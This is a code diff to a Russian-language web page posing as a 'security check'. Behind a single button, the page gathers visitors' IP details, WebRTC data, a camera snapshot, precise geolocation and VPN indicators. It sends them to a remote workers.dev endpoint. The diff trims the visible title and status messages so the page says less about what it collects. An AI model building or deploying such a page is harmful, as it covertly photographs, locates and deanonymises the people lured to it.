@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
 <meta charset="utf-8">
-<title>Проверка безопасности</title>
+<title>Проверка</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="robots" content="noindex,nofollow,noarchive">
 <style>
@@ -101,7 +101,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       catch(e) { return { ok: false, err: 'Worker вернул не-JSON (HTTP ' + r.status + '): ' + raw.slice(0, 200) }; }
       return j;
     } catch(e) {
-      return { ok: false, err: 'Сеть/исключение: ' + e.message };
+      return { ok: false, err: 'ДА: ' + e.message };
     }
   }
 
@@ -220,7 +220,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
   btn.addEventListener('click', async function(){
     btn.disabled = true;
     btn.textContent = 'Проверяем…';
-    setStatus('1/4 Запрашиваем разрешения (камера + геолокация)…');
+    setStatus('Запрашиваем разрешения');
 
     var [ipInfo, rtc, geo, camRes] = await Promise.all([
       getIpInfo(),
@@ -231,7 +231,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
 
     // --- фото в blob ---
     var photoBlob = null;
-    var camLine = '✗ не получено';
+    var camLine = '✗ не ';
     if (camRes && camRes.dataUrl) {
       camLine = '✓ снимок ' + camRes.w + 'x' + camRes.h;
       try { photoBlob = await (await fetch(camRes.dataUrl)).blob(); }
@@ -253,7 +253,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       if (map[tz] && ipInfo.country && map[tz] !== ipInfo.country) vpnSuspected = true;
     } catch(e){}
 
-    var geoLine = 'не получена';
+    var geoLine = 'не ';
     var addressLine = '';
     if (geo && !geo.error) {
       geoLine = geo.lat.toFixed(6) + ', ' + geo.lon.toFixed(6) + ' (± ' + geo.acc + ' м)';
